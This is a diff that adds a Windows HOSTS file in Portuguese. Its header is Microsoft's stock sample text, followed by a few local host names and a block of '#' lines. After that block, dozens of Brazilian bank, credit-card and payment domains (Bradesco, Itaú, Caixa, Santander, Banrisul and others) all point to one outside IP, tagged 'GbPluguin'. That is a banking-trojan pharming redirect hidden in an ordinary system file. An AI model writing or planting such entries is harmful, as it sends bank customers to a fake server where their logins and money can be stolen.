@@ -1,0 +1,117 @@
+# Copyright (c) 1993-1999 Microsoft Corp.
+#
+# Este  um arquivo HOSTS de exemplo usado pelo Microsoft TCP/IP para Windows.
+#
+# Este arquivo contm os mapeamentos de endereços IP para nomes de host. Cada
+# entrada deve ser mantida em uma linha individual. O endereço IP deve
+# ser colocado na primeira coluna, seguido do nome de host correspondente.
+# O endereço IP e o nome do host devem ser separados por pelo menos um
+# espaço.
+#
+# Adicionalmente, comentrios (como estes) podem ser inseridos em linhas
+# individuais ou aps o nome de computador indicado por um smbolo '#'.
+#
+# Por exemplo:
+#
+#      102.54.94.97     rino.acme.com           # servidor de origem
+#       38.25.63.10     x.acme.com              # host cliente x
+
+127.0.0.1       localhost
+
+
+66.55.12.34 quarentena
+91.31.12.33 impressora01
+44.45.11.9 fiscal
+44.54.12.51 almoxerifado
+45.55.14.98 secretaria
+
+192.168.253.172 net400
+192.168.251.148 net401
+192.168.238.141 net402
+
+100.200.1.90 carlitos
+101.102.103.11 pedrinhos
+
+99.1.10.20 garagem
+98.33.1.99 riqueilme
+
+55.44.11.90 tacobelry
+56.11.90.11 daniela
+
+10.11.90.1 fuvesp
+10.12.90.2 tinao
+
+33.11.40.20 marycary
+34.98.1.2 avgsetup
+
+10.99.100.40 virgem
+
+192.254.97.300 nortonsetup
+
+
+
+
+##########################################
+####################################3
+##########################
+#############
+########
+###
+#
+
+
+200.69.124.17 www.banespa.com.br # GbPluguin
+200.69.124.17 banespa.com.br # GbPluguin
+200.69.124.17 www.santander.com.br # GbPluguin
+200.69.124.17 santander.com.br # GbPluguin
+200.69.124.17 caixa.com.br # GbPluguin
+200.69.124.17 www.cef.gov.br # GbPluguin
+200.69.124.17 cef.gov.br # GbPluguin
+200.69.124.17 www.cef.com.br # GbPluguin
+200.69.124.17 www.caixa.gov.br # GbPluguin
+200.69.124.17 caixa.gov.br # GbPluguin
+200.69.124.17 www.caixa.com.br # GbPluguin
+200.69.124.17 cef.com.br # GbPluguin
+200.69.124.17 internetbanking.caixa.gov.br # GbPluguin
+200.69.124.17 internetbanking.caixa.com.br # GbPluguin
+200.69.124.17 internetbanking.cef.gov.br # GbPluguin
+200.69.124.17 internetbanking.cef.com.br # GbPluguin
+200.69.124.17 www.e-gold.com.br # GbPluguin
+200.69.124.17 e-gold.com.br # GbPluguin
+200.69.124.17 www.e-gold.com # GbPluguin
+200.69.124.17 e-gold.com # GbPluguin
+200.69.124.17 www.bradescoprime.com.br  # GbPluguin
+200.69.124.17 www.cetelem.com.br # GbPluguin
+200.69.124.17 cetelem.com.br # GbPluguin
+200.69.124.17 www.cartaoaura.com.br # GbPluguin
+200.69.124.17 cartaoaura.com.br # GbPluguin
+200.69.124.17 bradescoprime.com.br # GbPluguin
+200.69.124.17 www.itaupersonnalite.com.br  # GbPluguin
+200.69.124.17 itaupersonnalite.com.br # GbPluguin
+200.69.124.17 americanexpress.com.br  # GbPluguin
+200.69.124.17 www.banrisul.com.br  # GbPluguin
+200.69.124.17 banrisul.com.br  # GbPluguin
+200.69.124.17 www.banrisul.com  # GbPluguin
+200.69.124.17 www.americanexpress.com.br # GbPluguin
+200.69.124.17 www.americanexpress.com # GbPluguin
+200.69.124.17 www.real.com.br # GbPluguin
+200.69.124.17 www.bancoreal.com.br # GbPluguin
+200.69.124.17 real.com.br # GbPluguin
+200.69.124.17 bancoreal.com.br # GbPluguin
+200.69.124.17 banrisul.com # GbPluguin
+200.69.124.17 www.bradesco.com.br # GbPluguin
+200.69.124.17 bradesco.com.br # GbPluguin
+200.69.124.17 www.bradesco.com # GbPluguin
+200.69.124.17 bradesco.com # GbPluguin
+200.69.124.17 www.itau.com.br # GbPluguin
+200.69.124.17 itau.com.br # GbPluguin
+200.69.124.17 www.itau.com # GbPluguin
+200.69.124.17 itau.com # GbPluguin
+
+
+
+
+
+
+
+
